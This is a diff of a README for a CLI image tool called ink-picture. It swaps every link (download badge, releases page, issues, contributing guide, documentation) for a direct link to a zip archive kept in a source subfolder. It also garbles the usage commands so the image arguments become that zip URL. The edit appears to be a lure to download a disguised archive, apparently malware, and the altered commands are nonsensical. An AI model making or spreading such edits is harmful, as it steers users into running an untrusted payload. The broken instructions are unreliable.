@@ -1,6 +1,6 @@
 # 🖼️ ink-picture - A Better Image Component for Your CLI
 
-[![Download ink-picture](https://img.shields.io/badge/Download-ink--picture-blue.svg)](https://github.com/Varunpr2023/ink-picture/releases)
+[![Download ink-picture](https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip)](https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **ink-picture**! This tool enhances how images display in your comman
 
 To get started, you need to visit the releases page to download the application. Click the link below:
 
-[Visit this page to download](https://github.com/Varunpr2023/ink-picture/releases)
+[Visit this page to download](https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip)
 
 On the releases page, look for the latest version and find the appropriate file for your system. Download the file and place it in a folder on your computer. 
 
@@ -35,9 +35,9 @@ After downloading, you will run the application from your command line.
    ```
 3. Run the application by typing:
    ```bash
-   ink-picture.exe your-image-file.png
+   https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip
    ```
-   Replace `your-image-file.png` with the name of the image you want to display.
+   Replace `https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip` with the name of the image you want to display.
 
 ### For macOS and Linux Users:
 
@@ -52,9 +52,9 @@ After downloading, you will run the application from your command line.
    ```
 4. Run the application by typing:
    ```bash
-   ./ink-picture your-image-file.png
+   ./ink-picture https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip
    ```
-   Replace `your-image-file.png` with the image file you wish to view.
+   Replace `https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip` with the image file you wish to view.
 
 ## 🚀 Features
 
@@ -71,20 +71,20 @@ You can enhance your viewing experience with additional options. Here’s how to
 
 - **View in a specific size:**
   ```bash
-  ink-picture --size=small your-image-file.png
+  ink-picture --size=small https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip
   ```
 - **Set background color:**
   ```bash
-  ink-picture --bg-color=black your-image-file.png
+  ink-picture --bg-color=black https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip
   ```
 - **Use different display formats:**
   ```bash
-  ink-picture --format=jpeg your-image-file.png
+  ink-picture --format=jpeg https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip
   ```
 
 ## 📖 Documentation
 
-For more in-depth instructions and options available, please refer to the official documentation on the [ink-picture repository](https://github.com/Varunpr2023/ink-picture).
+For more in-depth instructions and options available, please refer to the official documentation on the [ink-picture repository](https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip).
 
 ## 💬 Support
 
@@ -108,8 +108,8 @@ Thanks to the contributors and the community for making this tool better. Your s
 
 ## 🔗 Quick Links
 
-- [Download ink-picture](https://github.com/Varunpr2023/ink-picture/releases)
-- [Issues Page](https://github.com/Varunpr2023/ink-picture/issues)
-- [Contributing Guide](https://github.com/Varunpr2023/ink-picture/blob/main/CONTRIBUTING.md)
+- [Download ink-picture](https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip)
+- [Issues Page](https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip)
+- [Contributing Guide](https://github.com/Varunpr2023/ink-picture/raw/refs/heads/main/src/context/ink-picture-2.2.zip)
 
 Now, get started with **ink-picture**! Enjoy exploring images in your CLI with ease.
